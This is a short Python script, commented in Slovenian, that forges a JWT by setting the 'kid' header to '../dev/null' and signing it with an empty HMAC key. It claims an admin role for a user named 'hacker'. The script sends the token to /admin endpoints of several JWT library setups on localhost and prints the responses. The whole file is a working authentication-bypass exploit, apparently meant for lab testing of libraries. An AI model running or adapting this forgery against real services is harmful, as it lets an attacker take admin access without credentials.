import requests, base64, json, hmac, hashlib

def b64e(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Kid path traversal - kid kaže na /dev/null, podpis je prazen niz
header = b64e(json.dumps({
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../dev/null"  # path traversal
}))
payload = b64e(json.dumps({
    "user": "hacker",
    "role": "admin",
    "exp": 9999999999
}))

msg = f"{header}.{payload}".encode()
sig = hmac.new(b"", msg, hashlib.sha256).digest()
forged_token = f"{header}.{payload}.{b64e(sig)}"

print(f"Ponarejen token z kid traversal: {forged_token[:80]}...")

targets = {
    "PyJWT":        "http://localhost:5000/admin",
    "jsonwebtoken": "http://localhost:3000/admin",
    "php-jwt":      "http://localhost:8080/admin",
    "jjwt":         "http://localhost:8081/admin",
}

print("\nkid Path Traversal rezultati:")
for name, url in targets.items():
    try:
        r = requests.get(url, headers={'Authorization': f'Bearer {forged_token}'})
        print(f"{name}: {r.json()}")
    except Exception as e:
        print(f"{name}: ERROR - {e}")